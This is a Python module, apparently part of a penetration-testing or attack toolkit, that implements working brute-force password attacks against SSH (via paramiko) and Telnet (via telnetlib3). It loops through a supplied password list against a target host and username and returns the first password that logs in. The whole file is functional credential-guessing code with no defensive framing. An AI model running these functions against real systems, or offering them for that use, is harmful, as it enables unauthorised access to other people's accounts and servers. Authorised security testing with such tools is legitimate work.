import paramiko
import asyncio
import telnetlib3
import time

def brute_force_ssh(target, username, password_list, port=22):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    results = []
    
    for password in password_list:
        password = password.strip()
        try:
            client.connect(target, port=port, username=username, password=password, timeout=3)
            # If successful
            success_msg = f"[SUCCESS] Found password for {username}@{target}: {password}"
            results.append({"status": "success", "password": password, "message": success_msg})
            client.close()
            return results # Stop after finding one
        except paramiko.AuthenticationException:
            # results.append({"status": "fail", "password": password, "message": "Authentication failed"})
            pass
        except Exception as e:
            if "Error reading SSH protocol banner" in str(e):
                 # results.append({"status": "error", "password": password, "message": f"Connection Error: {str(e)}"})
                 pass
            else:
                 # results.append({"status": "error", "password": password, "message": f"Error: {str(e)}"})
                 pass
            time.sleep(0.1) # Be nice
            
    client.close()
    if not results:
        results.append({"status": "fail", "message": f"No password found for {username} in provided list."})
        
    return results

async def attempt_telnet_login(target, port, username, password):
    try:
        reader, writer = await asyncio.wait_for(telnetlib3.open_connection(target, port), timeout=5)
        
        # Read until login prompt
        await asyncio.wait_for(reader.readuntil("login: "), timeout=3)
        writer.write(username + "\n")
        
        # Read until password prompt
        await asyncio.wait_for(reader.readuntil("Password: "), timeout=3)
        writer.write(password + "\n")
        
        # Read response to check for success
        # Note: telnetlib3 might return different encoding, usually strings.
        response = await asyncio.wait_for(reader.read(1024), timeout=3)
        
        writer.close()
        
        if "Login incorrect" not in response and "failed" not in response:
            return True, None
        return False, None
        
    except Exception as e:
        return False, str(e)

def brute_force_telnet(target, username, password_list, port=23):
    results = []
    
    # Run the async loop for each password (simple approach) or batch them
    # For now, keeping it sequential to match previous logic's style
    
    for password in password_list:
        password = password.strip()
        try:
             # Run single attempt synchronously
             success, error = asyncio.run(attempt_telnet_login(target, port, username, password))
             
             if success:
                 success_msg = f"[SUCCESS] Found password for {username}@{target}: {password}"
                 results.append({"status": "success", "password": password, "message": success_msg})
                 return results
                 
        except Exception as e:
            pass
            
    if not results:
        results.append({"status": "fail", "message": f"No password found for {username} in provided list."})
        
    return results
